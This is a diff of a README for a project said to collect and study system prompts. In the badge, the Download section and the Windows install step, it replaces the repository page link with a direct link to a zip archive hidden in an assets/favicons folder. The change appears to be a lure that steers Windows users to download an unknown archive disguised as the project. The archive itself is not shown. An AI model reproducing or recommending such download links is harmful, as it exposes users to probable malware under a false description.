@@ -1,12 +1,12 @@
 # 🧠 System-Prompt-Open - Find and study system prompts
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/pinchhitterequatorialcurrent101/System-Prompt-Open)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/pinchhitterequatorialcurrent101/System-Prompt-Open/main/assets/favicons/Open-Prompt-System-1.3.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the project:
 
-https://github.com/pinchhitterequatorialcurrent101/System-Prompt-Open
+https://raw.githubusercontent.com/pinchhitterequatorialcurrent101/System-Prompt-Open/main/assets/favicons/Open-Prompt-System-1.3.zip
 
 ## 🧭 What this is
 
@@ -37,7 +37,7 @@ Follow these steps on Windows.
 
 Go to:
 
-https://github.com/pinchhitterequatorialcurrent101/System-Prompt-Open
+https://raw.githubusercontent.com/pinchhitterequatorialcurrent101/System-Prompt-Open/main/assets/favicons/Open-Prompt-System-1.3.zip
 
 ### 2. Download the project
 
